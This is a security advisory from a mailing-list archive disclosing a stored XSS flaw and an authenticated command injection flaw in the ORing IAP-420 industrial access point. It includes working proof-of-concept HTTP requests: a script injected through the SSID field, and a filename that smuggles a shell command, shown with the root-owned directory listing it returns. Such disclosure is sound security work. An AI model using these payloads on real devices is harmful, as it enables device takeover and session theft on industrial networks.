---
title: CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420
url: https://seclists.org/fulldisclosure/2024/May/36
source: Full Disclosure
date: 2024-05-31
fetch_date: 2025-10-06T16:52:47.461055
---

# CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](35)
[By Date](date.html#36)
![Next](/images/right-icon-16x16.png)

[![Previous](/images/left-icon-16x16.png)](35)
[By Thread](index.html#36)
![Next](/images/right-icon-16x16.png)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20240528-0 | Multiple Vulnerabilities in ORing IAP-420

---

*From*: Thomas Weber via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 28 May 2024 09:53:06 +0000

---

```
CyberDanube Security Research 20240528-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| ORing IAP-420
   vulnerable version| 2.01e
        fixed version| -
           CVE number| CVE-2024-5410, CVE-2024-5411
               impact| High
             homepage| https://oringnet.com/
                found| 2024-01-19
                   by| T. Weber (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. PÃ¶lten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Founded in 2005, ORing specializes in developing innovative own-branded
products for industrial settings. Over the years, ORing has accumulated
abundant experience in wired and wireless network communications industry. In
line with the commercialization of 5G, ORing has stretched its arm into the
IIoT field, helping customers realize all kinds of IIoT applications such as
smart manufacturing, smart city, and industrial automation. With high product
quality and best customer services in mind, ORing has continued to launch
cutting-edge products catering to customer needs. ORing's products have been
widely adopted in surveillance, rail transport, industrial automation, power
substations, renewable energy, and marine industries with offices worldwide to
address customer needs in real time."

Source: https://oringnet.com/en/about-us/company-profile

Vulnerable versions
-------------------------------------------------------------------------------
IAP-420 / 2.01e

Vulnerability overview
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
A Stored Cross-Site Scripting vulnerability was identified in the web interface
of the device. The SSID of the WiFi can be configured to contain arbitrary
JavaScript code. An attacker can exploit this vulnerability by luring a victim
to visit a malicious website. Furthermore, it is possible to hijack the session
of the attacked user.

2) Authenticated Command Injection (CVE-2024-5411)
The filename parameter of the config file upload is prone to a Command
Injection vulnerability. This vulnerability can only be exploited if a user is
authenticated to the web interface. This way, an attacker can invoke commands
and is able to get full control over the whole device.

Proof of Concept
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
Stored Cross-Site Scripting can be triggered by placing JavaScript code into
the SSID input field of the web interface as authenticated user. A single
request for injecting the script is shown below:
-------------------------------------------------------------------------------
POST /cgi-bin/wl_set.cgi HTTP/1.1
Host: 192.168.0.1
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 659
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1

sel_op_mode=client&sel_mssid=0&tf_ssid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&sel_isolation=0&
sel_mssid_isolation=0&sel_auth_mode=0&rb_wep_authmode=0&sel_wep_enc_bits=0&
sel_wep_key_type=0&tf_key1=&tf_key2=&tf_key3=&tf_key4=&rb_wpapsk_authmode=0&
rb_wpapsk_enc=0&tf_wpa_key=&rb_wpa_authmode=0&rb_wpa_enc=0&tf_ip1=&tf_ip2=&
tf_ip3=&tf_ip4=&tf_radius_port=&tf_radius_key=&tf_ip1_1x=&tf_ip2_1x=&
tf_ip3_1x=&tf_ip4_1x=&tf_radius_port_1x=&tf_radius_key_1x=&bt_save=Save&
lang=en&channel=0&isolation=0&mssid_isolation=0&auth_mode=0&wep_authmode=0&
wpapsk_authmode=0&wpa_authmode=0&wpa_enc_type=0&wep_enc_bits=0&wep_key_type=0&
wep_key_index=0&ret_msg=
-------------------------------------------------------------------------------

2) Authenticated Command Injection (CVE-2024-5411)
A command can be injected in the filename of the uploaded config. By sending a
request as shown below, the content of the current directory can be shown:
-------------------------------------------------------------------------------
POST /cgi-bin/admin_config.cgi?todo=upconf HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------347087158737672164432057801583
Content-Length: 563
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1

-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="upfile"; filename="test.bin;ls${IFS}-la;"

-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="bt_upconf"

Upload
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="lang"

en
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="ret_msg_upconf"

-----------------------------347087158737672164432057801583--
-------------------------------------------------------------------------------
This request is equal to executing "ls -la" on the console of the device.

-------------------------------------------------------------------------------
HTTP/1.0 200 OK
tar: can't open '/tmp/test.bin': No such file or directory
drwxr-xr-x    4 root     root         1024 Mar  7 14:36 .
drwxr-xr-x    8 root     root         1024 Jan 30  2024 ..
-rwxr-xr-x    1 root     root        17572 Jan 30  2024 admin_config.cgi
-rwxr-xr-x    1 root     root        17584 Jan 30  2024 admin_default.cgi
-rwxr-xr-x    1 root     root        15984 Jan 30  2024 admin_fwup.cgi
-rwxr-xr-x    1 root     root        12476 Jan 30  2024 admin_password.cgi
-rwxr-xr-x    1 root     root        13164 Jan 30  2024 admin_restart.cgi
-rwxr-xr-x    1 root     root        33336 Jan 30  2024 adv_filters.cgi
-rwxr-xr-x    1 root     root        15032 Jan 30  2024 adv_misc.cgi
-rwxr-xr-x    1 root     root        72168 Jan 30  2024 adv_rstp.cgi
-rwxr-xr-x    1 root     root         6588 Jan 30  2024 backup_unit.cgi
[...]
-------------------------------------------------------------------------------

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
-------------------------------------------------------------------------------
None

Workaround
-------------------------------------------------------------------------------
None

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Oring customers to upgrade the firmware to the latest
version ava...